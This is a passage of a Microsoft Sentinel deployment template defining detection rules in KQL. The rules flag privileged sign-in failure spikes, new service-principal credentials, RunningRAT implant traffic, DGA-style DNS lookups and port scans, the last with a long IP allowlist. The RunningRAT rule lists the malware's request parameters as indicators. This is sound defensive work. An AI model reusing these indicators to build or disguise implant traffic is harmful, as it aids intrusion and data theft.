            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1098",
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "4d94d4a9-dc96-410a-8dea-4d4d4584188b",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "AccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "TargetUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "TargetName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "TargetUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.6"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/0bb0743b-f493-4094-8a59-13ac55749666')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/0bb0743b-f493-4094-8a59-13ac55749666')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Privileged Accounts - Sign in Failure Spikes",
          "description": " Identifies spike in failed sign-ins from Privileged accounts. Privileged accounts list can be based on IdentityInfo UEBA table.\nSpike is determined based on Time series anomaly which will look at historical baseline values.\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-accounts#things-to-monitor",
          "severity": "High",
          "enabled": true,
          "query": "let starttime = 14d;\nlet timeframe = 1d;\nlet scorethreshold = 3;\nlet baselinethreshold = 5;\nlet aadFunc = (tableName:string){\n    IdentityInfo\n    | where TimeGenerated > ago(starttime)\n    | summarize arg_max(TimeGenerated, *) by AccountUPN\n    | mv-expand AssignedRoles\n    | where AssignedRoles contains 'Admin' or GroupMembership has \"Admin\"\n    | summarize Roles = make_list(AssignedRoles) by AccountUPN = tolower(AccountUPN)\n    | join kind=inner (\n        table(tableName)\n        | where TimeGenerated between (startofday(ago(starttime))..startofday(now()))\n        | where ResultType != 0\n        | extend UserPrincipalName = tolower(UserPrincipalName)\n    ) on $left.AccountUPN == $right.UserPrincipalName\n    | extend timestamp = TimeGenerated, AccountCustomEntity = UserPrincipalName, Roles = tostring(Roles)\n};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nlet allSignins = union isfuzzy=true aadSignin, aadNonInt;\nlet TimeSeriesAlerts = \n    allSignins\n    | make-series HourlyCount=count() on TimeGenerated from startofday(ago(starttime)) to startofday(now()) step 1h by UserPrincipalName, Roles\n    | extend (anomalies, score, baseline) = series_decompose_anomalies(HourlyCount, scorethreshold, -1, 'linefit')\n    | mv-expand HourlyCount to typeof(double), TimeGenerated to typeof(datetime), anomalies to typeof(double), score to typeof(double), baseline to typeof(long)\n    // Filtering low count events per baselinethreshold\n    | where anomalies > 0 and baseline > baselinethreshold\n    | extend AnomalyHour = TimeGenerated\n    | project UserPrincipalName, Roles, AnomalyHour, TimeGenerated, HourlyCount, baseline, anomalies, score;\n// Filter the alerts for specified timeframe\nTimeSeriesAlerts\n| where TimeGenerated > startofday(ago(timeframe))\n| join kind=inner ( \n    allSignins\n    | where TimeGenerated > startofday(ago(timeframe))\n    // create a new column and round to hour\n    | extend DateHour = bin(TimeGenerated, 1h)\n    | summarize PartialFailedSignins = count(), LatestAnomalyTime = arg_max(TimeGenerated, *) by bin(TimeGenerated, 1h), OperationName, Category, ResultType, ResultDescription, UserPrincipalName, Roles, UserDisplayName, AppDisplayName, ClientAppUsed, IPAddress, ResourceDisplayName\n) on UserPrincipalName, $left.AnomalyHour == $right.DateHour\n| project LatestAnomalyTime, OperationName, Category, UserPrincipalName, Roles = todynamic(Roles), UserDisplayName, ResultType, ResultDescription, AppDisplayName, ClientAppUsed, UserAgent, IPAddress, Location, AuthenticationRequirement, ConditionalAccessStatus, ResourceDisplayName, PartialFailedSignins, TotalFailedSignins = HourlyCount, baseline, anomalies, score\n| extend Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "34c5aff9-a8c2-4601-9654-c7e46342d03b",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/32aadc6c-0dfd-4a71-950c-b3173a8fef1e')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/32aadc6c-0dfd-4a71-950c-b3173a8fef1e')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "New access credential added to Application or Service Principal",
          "description": "This will alert when an admin or app owner account adds a new credential to an Application or Service Principal where a verify KeyCredential was already present for the app.\nIf a threat actor obtains access to an account with sufficient privileges and adds the alternate authentication material triggering this event, the threat actor can now authenticate as the Application or Service Principal using this credential.\nAdditional information on OAuth Credential Grants can be found in RFC 6749 Section 4.4 or https://docs.microsoft.com/azure/active-directory/develop/v2-oauth2-client-creds-grant-flow\nFor further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.",
          "severity": "Medium",
          "enabled": true,
          "query": "AuditLogs\n| where OperationName has_any (\"Add service principal\", \"Certificates and secrets management\") // captures \"Add service principal\", \"Add service principal credentials\", and \"Update application - Certificates and secrets management\" events\n| where Result =~ \"success\"\n| where tostring(InitiatedBy.user.userPrincipalName) has \"@\" or tostring(InitiatedBy.app.displayName) has \"@\"\n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type =~ \"Application\"\n      | extend targetDisplayName = tostring(TargetResource.displayName),\n               targetId = tostring(TargetResource.id),\n               targetType = tostring(TargetResource.type),\n               keyEvents = TargetResource.modifiedProperties\n  )\n| mv-apply Property = keyEvents on \n  (\n      where Property.displayName =~ \"KeyDescription\"\n      | extend new_value_set = parse_json(tostring(Property.newValue)),\n               old_value_set = parse_json(tostring(Property.oldValue))\n  )\n| where old_value_set != \"[]\"\n| extend diff = set_difference(new_value_set, old_value_set)\n| where isnotempty(diff)\n| parse diff with * \"KeyIdentifier=\" keyIdentifier:string \",KeyType=\" keyType:string \",KeyUsage=\" keyUsage:string \",DisplayName=\" keyDisplayName:string \"]\" *\n| where keyUsage =~ \"Verify\"\n| mv-apply AdditionalDetail = AdditionalDetails on \n  (\n      where AdditionalDetail.key =~ \"User-Agent\"\n      | extend UserAgent = tostring(AdditionalDetail.value)\n  )\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n// The below line is currently commented out but Microsoft Sentinel users can modify this query to show only Application or only Service Principal events in their environment\n//| where targetType =~ \"Application\" // or targetType =~ \"ServicePrincipal\"\n| project-away diff, new_value_set, old_value_set\n| project-reorder TimeGenerated, OperationName, InitiatingAppName, InitiatingAppServicePrincipalId, InitiatingUserPrincipalName, InitiatingAadUserId, InitiatingIpAddress, UserAgent, targetDisplayName, targetId, targetType, keyDisplayName, keyType, keyUsage, keyIdentifier, CorrelationId, TenantId\n| extend Name = tostring(split(InitiatingUserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(InitiatingUserPrincipalName,'@',1)[0])\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1550"
          ],
          "subTechniques": [
            "T1550.001"
          ],
          "alertRuleTemplateName": "79566f41-df67-4e10-a703-c38a6213afd8",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIpAddress"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAppServicePrincipalId"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/fe6248d9-e0af-408d-82df-07f44648e161')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/fe6248d9-e0af-408d-82df-07f44648e161')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "RunningRAT request parameters",
          "description": "This detection will alert when RunningRAT URI parameters or paths are detect in an HTTP request.\nId the device blocked this communication presence of this alert means the RunningRAT implant is likely still executing on the source host.",
          "severity": "High",
          "enabled": true,
          "query": "let runningRAT_parameters = dynamic(['/ui/chk', 'mactok=', 'UsRnMe=', 'IlocalP=', 'kMnD=']);\nCommonSecurityLog\n| where RequestMethod == \"GET\"\n| project TimeGenerated, DeviceVendor, DeviceProduct, DeviceAction, DestinationDnsDomain, DestinationIP, RequestURL, SourceIP, SourceHostName, RequestClientApplication\n| where RequestURL has_any (runningRAT_parameters)\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Exfiltration",
            "CommandAndControl"
          ],
          "techniques": [
            "T1041",
            "T1071"
          ],
          "subTechniques": [
            "T1071.001"
          ],
          "alertRuleTemplateName": "baedfdf4-7cc8-45a1-81a9-065821628b83",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "SourceHostName"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "DestinationIP"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "RequestURL"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/b092c9ad-e1bf-4645-9d1e-0bb198ed8e71')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/b092c9ad-e1bf-4645-9d1e-0bb198ed8e71')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Potential DGA detected (ASIM DNS Schema)",
          "description": "Identifies clients with a high NXDomain count which could be indicative of a DGA (cycling through possible C2 domains where most C2s are not live). Alert is generated when a new IP address is seen (based on not being seen associated with \nNXDomain records in prior 10-day baseline period).\nThis analytic rule uses [ASIM](https://aka.ms/AboutASIM) and supports any built-in or custom source that supports the ASIM DNS schema",
          "severity": "Medium",
          "enabled": true,
          "query": "let referencestarttime = 10d;\nlet referenceendtime = 1d;\nlet threshold = 100;\nlet nxDomainDnsEvents = (stime:datetime, etime:datetime) \n  {_Im_Dns(responsecodename='NXDOMAIN', starttime=stime, endtime=etime)\n  | where DnsQueryTypeName in (\"A\", \"AAAA\")\n  | where ipv4_is_match(\"127.0.0.1\", SrcIpAddr) == False\n  | where DnsQuery !contains \"/\" and  DnsQuery contains \".\"};\nnxDomainDnsEvents (stime=ago(referenceendtime) ,etime=now())\n  | extend sld = tostring(split(DnsQuery, \".\")[-2])\n  | summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), dcount(sld) by SrcIpAddr\n  | where dcount_sld > threshold\n  // Filter out previously seen IPs\n  | join kind=leftanti (nxDomainDnsEvents (stime=ago(referencestarttime), etime=ago(referenceendtime))\n    | extend sld = tostring(split(DnsQuery, \".\")[-2])\n    | summarize dcount(sld) by SrcIpAddr\n    | where dcount_sld > threshold ) on SrcIpAddr\n// Pull out sample NXDomain responses for those remaining potentially infected IPs\n| join kind = inner (nxDomainDnsEvents (stime=ago(referencestarttime), etime=now()) | summarize by DnsQuery, SrcIpAddr) on SrcIpAddr\n| summarize StartTime = min(StartTime), EndTime = max(EndTime), sampleNXDomainList=make_list(DnsQuery, 100)  by SrcIpAddr, dcount_sld\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P10D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1568",
            "T1008"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "983a6922-894d-413c-9f04-d7add0ecc307",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.3.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/0c3e7307-2b45-4aa3-b0ad-e24bc3cf4729')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/0c3e7307-2b45-4aa3-b0ad-e24bc3cf4729')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Suscessful Port Scan",
          "description": "",
          "severity": "Medium",
          "enabled": false,
          "query": "let PortScanThreshold = 50;\n_Im_NetworkSession\n| where ipv4_is_private(SrcIpAddr) == False\n| where SrcIpAddr !in (\"127.0.0.1\", \"::1\")\n| where SrcIpAddr !has \"8.8.8.8\" //Remove Google\n| where SrcIpAddr  !has \"134.186.254.252\"\n| where SrcIpAddr  !has \"165.235.254.254\"\n| where SrcIpAddr  !has \"158.96.0.254\"\n| where SrcIpAddr  !has \"52.113.194.132\"\n| where SrcIpAddr  !has \"13.66.149.68\"\n| where SrcIpAddr  !has \"40.78.253.193\"\n| where SrcIpAddr  !has \"20.140.134.65\"\n| where SrcIpAddr  !has \"40.64.132.84\"\n| where SrcIpAddr  !has \"20.141.106.5\"\n| where SrcIpAddr  !has \"149.96.185.176\"\n| where SrcIpAddr  !has \"20.190.133.42\"\n| where SrcIpAddr  !has \"20.189.172.20\"\n| where SrcIpAddr  !has \"52.245.212.172\"\n| where SrcIpAddr  !has \"20.140.137.183\"\n| where SrcIpAddr  !has \"13.66.140.169\"\n| where SrcIpAddr  !has \"40.126.26.134\"\n| where SrcIpAddr  !has \"20.140.137.181\"\n| where SrcIpAddr  !has \"52.245.229.220\"\n| where SrcIpAddr  !has \"20.141.100.96\"\n| where SrcIpAddr  !has \"40.78.243.18\"\n| where SrcIpAddr  !has \"20.42.65.89\"\n| where SrcIpAddr  !has \"13.66.149.69\"\n| where SrcIpAddr  !has \"40.126.4.104\"\n| where SrcIpAddr  !has \"20.191.46.109\"\n| where SrcIpAddr  !has \"20.190.154.136\"\n| where SrcIpAddr  !has \"20.140.95.0\"\n| where SrcIpAddr  !has \"52.245.214.38\"\n| where SrcIpAddr  !has \"40.126.26.135\"\n| where SrcIpAddr  !has \"20.190.154.139\"\n| where SrcIpAddr  !has \"40.126.26.133\"\n| where SrcIpAddr  !has \"20.189.173.6\"\n| where SrcIpAddr  !has \"165.235.22.59\"\n| where SrcIpAddr  !has \"168.149.132.32\"\n| where SrcIpAddr  !has \"23.33.16.28\"\n| where SrcIpAddr  !has \"52.104.83.53\"\n| where SrcIpAddr  !has \"20.189.173.2\"\n| where SrcIpAddr  !has \"13.89.179.9\"\n| where SrcIpAddr  !has \"52.168.117.170\"\n| where SrcIpAddr  !has \"20.54.89.15\"\n| where SrcIpAddr  !has \"13.89.179.10\"\n| where SrcIpAddr  !has \"20.190.151.70\"\n| where SrcIpAddr  !has \"20.190.151.131\"\n| where SrcIpAddr  !has \"20.190.151.8\"\n| where SrcIpAddr  !has \"20.189.173.12\"\n| where SrcIpAddr  !has \"20.190.151.134\"\n| where SrcIpAddr  !has \"20.189.173.1\"\n| where SrcIpAddr  !has \"20.190.151.133\"\n| where SrcIpAddr  !has \"20.189.173.13\"\n| where SrcIpAddr  !has \"20.106.86.13\"\n| where SrcIpAddr  !has \"20.42.65.90\"\n| where SrcIpAddr  !has \"20.190.151.7\"\n| where SrcIpAddr  !has \"52.182.143.208\"\n| where SrcIpAddr  !has \"20.42.65.88\"\n| where SrcIpAddr  !has \"20.42.73.24\"\n| where SrcIpAddr  !has \"23.33.16.11\"\n| where SrcIpAddr  !has \"20.190.154.138\"\n| where SrcIpAddr  !has \"13.89.178.26\"\n| where SrcIpAddr  !has \"20.190.154.18\"\n| where SrcIpAddr  !has \"204.79.197.239\"\n| where SrcIpAddr  !has \"20.190.151.6\"\n| where SrcIpAddr  !has \"52.175.198.74\"\n| where SrcIpAddr  !has \"20.44.10.122\"\n| where SrcIpAddr  !has \"20.190.151.132\"\n| where SrcIpAddr  !has \"20.190.151.67\"\n| where SrcIpAddr  !has \"40.78.253.203\"\n| where SrcIpAddr  !has \"20.190.154.19\"\n| where SrcIpAddr  !has \"52.168.117.169\"\n| where SrcIpAddr  !has \"52.168.112.66\"\n| where SrcIpAddr  !has \"20.190.151.68\"\n| where SrcIpAddr  !has \"20.190.154.17\"\n| where SrcIpAddr  !has \"20.189.173.4\"\n| where SrcIpAddr  !has \"52.96.113.194\"\n| where SrcIpAddr  !has \"52.96.113.130\"\n| where SrcIpAddr  !has \"52.96.121.50\"\n| where SrcIpAddr  !has \"52.96.164.226\"\n| where SrcIpAddr  !has \"204.79.197.200\"\n| where SrcIpAddr  !has \"52.96.121.18\"\n| where SrcIpAddr  !has \"52.96.164.114\"\n| where SrcIpAddr  !has \"52.96.121.2\"\n| where SrcIpAddr  !has \"40.97.205.2\"\n| where SrcIpAddr  !has \"52.96.166.34\"\n| where SrcIpAddr  !has \"52.96.119.114\"\n| where SrcIpAddr  !has \"52.96.166.50\"\n| where SrcIpAddr  !has \"52.96.164.194\"\n| where SrcIpAddr  !has \"52.96.223.50\"\n| where SrcIpAddr  !has \"52.96.121.34\"\n| where SrcIpAddr  !has \"52.96.113.162\"\n| where SrcIpAddr  !has \"52.96.164.210\"\n| where SrcIpAddr  !has \"52.96.119.98\"\n| where SrcIpAddr  !has \"52.96.164.82\"\n| where SrcIpAddr  !has \"52.96.113.226\"\n| where SrcIpAddr  !has \"52.96.164.242\"\n| where SrcIpAddr  !has \"52.96.164.66\"\n| where SrcIpAddr  !has \"52.96.184.146\"\n| where SrcIpAddr  !has \"52.96.166.66\"\n| where SrcIpAddr  !has \"52.96.113.146\"\n| where SrcIpAddr  !has \"52.96.91.34\"\n| where SrcIpAddr  !has \"52.96.113.210\"\n| where SrcIpAddr  !has \"52.96.166.82\"\n| where SrcIpAddr  !has \"52.96.113.242\"\n| where SrcIpAddr  !has \"40.97.205.18\"\n| where SrcIpAddr  !has \"52.96.113.178\"\n| where SrcIpAddr  !has \"52.96.165.18\"\n| where SrcIpAddr  !has \"13.107.21.200\"\n| where SrcIpAddr  !has \"52.96.165.2\"\n| where SrcIpAddr  !has \"40.97.204.18\"\n| where SrcIpAddr  !has \"31.13.70.36\"\n| where SrcIpAddr  !has \"40.119.6.228\"\n| where SrcIpAddr  !has \"52.244.39.94\"\n| where SrcIpAddr  !has \"52.109.20.80\"\n| where SrcIpAddr  !has \"52.244.35.143\"\n| where SrcIpAddr  !has \"52.115.252.96\"\n| where SrcIpAddr  !has \"3.230.130.186\"\n| where SrcIpAddr  !has \"23.63.37.168\"\n| where SrcIpAddr  !has \"13.107.6.158\"\n| where SrcIpAddr  !has \"20.190.151.69\"\n| where SrcIpAddr  !has \"52.238.76.165\"\n| where SrcIpAddr  !has \"52.244.219.109\"\n| where SrcIpAddr  !has \"20.189.173.15\"\n| where SrcIpAddr  !has \"13.67.15.128\"\n| where SrcIpAddr  !has \"131.253.33.203\"\n| where SrcIpAddr  !has \"23.196.38.188\"\n| where SrcIpAddr  !has \"20.190.151.9\"\n| where SrcIpAddr  !has \"52.168.112.67\"\n| where SrcIpAddr  !has \"40.126.26.160\"\n| where SrcIpAddr  !has \"13.72.10.35\"\n| where SrcIpAddr  !has \"20.190.154.160\"\n| where SrcIpAddr  !has \"52.109.8.44\"\n| where SrcIpAddr  !has \"20.50.201.195\"\n| where SrcIpAddr  !has \"52.182.143.210\"\n| where SrcIpAddr  !has \"158.96.2.241\"\n| where SrcIpAddr  !has \"52.127.244.50\"\n| where SrcIpAddr  !has \"204.79.197.203\"\n| where SrcIpAddr  !has \"20.80.188.247\"\n| where SrcIpAddr  !has \"51.104.162.168\"\n| where SrcIpAddr  !has \"40.126.26.132\"\n| where SrcIpAddr  !has \"20.224.254.73\"\n| where SrcIpAddr  !has \"52.153.255.201\"\n| where SrcIpAddr  !has \"40.79.141.153\"\n| where SrcIpAddr  !has \"52.115.248.66\"\n| where SrcIpAddr  !has \"104.208.16.90\"\n| where SrcIpAddr  !has \"52.115.248.3\"\n| where SrcIpAddr  !has \"13.107.6.163\"\n| where SrcIpAddr  !has \"52.152.108.96\"\n| where SrcIpAddr  !has \"52.182.143.211\"\n| where SrcIpAddr  !has \"40.119.249.228\"\n| where SrcIpAddr  !has \"34.199.101.34\"\n| where SrcIpAddr  !has \"13.69.116.104\"\n| where SrcIpAddr  !has \"13.69.239.73\"\n| where SrcIpAddr  !has \"52.115.248.8\"\n| where SrcIpAddr  !has \"69.164.40.0\"\n| where SrcIpAddr  !has \"13.107.21.239\"\n| where SrcIpAddr  !has \"52.235.133.100\"\n| where SrcIpAddr  !has \"69.164.41.0\"\n| where SrcIpAddr  !has \"40.78.253.204\"\n| where SrcIpAddr  !has \"52.115.248.117\"\n| where SrcIpAddr  !has \"52.115.252.3\"\n| where SrcIpAddr  !has \"23.56.0.49\"\n| where SrcIpAddr  !has \"104.208.16.89\"\n| where SrcIpAddr  !has \"23.217.140.147\"\n| where SrcIpAddr  !has \"52.115.248.28\"\n| where SrcIpAddr  !has \"20.189.173.14\"\n| where SrcIpAddr  !has \"104.208.16.88\"\n| where SrcIpAddr  !has \"52.109.77.2\"\n| where SrcIpAddr  !has \"44.198.154.229\"\n| where SrcIpAddr  !has \"104.46.162.226\"\n| where SrcIpAddr  !has \"51.104.15.252\"\n| where SrcIpAddr  !has \"23.63.33.138\"\n| where SrcIpAddr  !has \"40.82.248.226\"\n| where SrcIpAddr  !has \"23.223.246.80\"\n| where SrcIpAddr  !has \"40.126.26.32\"\n| where SrcIpAddr  !has \"13.107.42.16\"\n| where SrcIpAddr  !has \"146.75.42.2\"\n| where SrcIpAddr  !has \"34.197.224.31\"\n| where SrcIpAddr  !has \"20.189.173.7\"\n| where SrcIpAddr  !has \"13.89.178.27\"\n| where SrcIpAddr  !has \"52.109.20.12\"\n| where SrcIpAddr  !has \"20.42.73.25\"\n| where SrcIpAddr  !has \"20.50.80.209\"\n| where SrcIpAddr  !has \"51.104.167.255\"\n| where SrcIpAddr  !has \"20.42.65.85\"\n| where SrcIpAddr  !has \"40.74.98.194\"\n| where SrcIpAddr  !has \"20.54.24.69\"\n| where SrcIpAddr  !has \"20.42.73.27\"\n| where SrcIpAddr  !has \"20.189.173.11\"\n| where SrcIpAddr  !has \"52.167.17.97\"\n| where SrcIpAddr  !has \"44.192.203.20\"\n| where SrcIpAddr  !has \"13.89.179.8\"\n| where SrcIpAddr  !has \"23.217.140.177\"\n| where SrcIpAddr  !has \"52.178.17.3\"\n| where SrcIpAddr  !has \"23.63.41.157\"\n| where SrcIpAddr  !has \"52.182.141.63\"\n| where SrcIpAddr  !has \"20.190.132.41\"\n| where SrcIpAddr  !has \"146.75.43.10\"\n| where SrcIpAddr  !has \"23.63.40.157\"\n| where SrcIpAddr  !has \"52.182.141.192\"\n| where SrcIpAddr  !has \"20.123.141.233\"\n| where SrcIpAddr  !has \"52.109.0.73\"\n| where SrcIpAddr  !has \"52.115.252.80\"\n| where SrcIpAddr  !has \"52.242.97.97\"\n| where SrcIpAddr  !has \"23.49.3.69\"\n| where SrcIpAddr  !has \"52.109.2.84\"\n| where SrcIpAddr  !has \"20.42.72.131\"\n| where SrcIpAddr  !has \"13.69.109.131\"\n| where SrcIpAddr  !has \"23.223.246.18\"\n| where SrcIpAddr  !has \"40.78.253.202\"\n| where SrcIpAddr  !has \"52.115.252.119\"\n| where SrcIpAddr  !has \"34.204.156.177\"\n| where SrcIpAddr  !has \"20.50.73.9\"\n| where SrcIpAddr  !has \"13.69.239.72\"\n| where SrcIpAddr  !has \"52.115.248.121\"\n| where SrcIpAddr  !has \"51.11.168.232\"\n| where SrcIpAddr  !has \"52.178.17.2\"\n| where SrcIpAddr  !has \"3.234.113.157\"\n| where SrcIpAddr  !has \"34.225.179.178\"\n| where SrcIpAddr  !has \"52.115.252.101\"\n| where SrcIpAddr  !has \"40.126.4.40\"\n| where SrcIpAddr  !has \"23.223.246.75\"\n| where SrcIpAddr  !has \"40.119.46.46\"\n| where SrcIpAddr  !has \"20.44.239.154\"\n| where SrcIpAddr  !has \"20.189.173.5\"\n| where SrcIpAddr  !has \"52.109.20.82\"\n| where SrcIpAddr 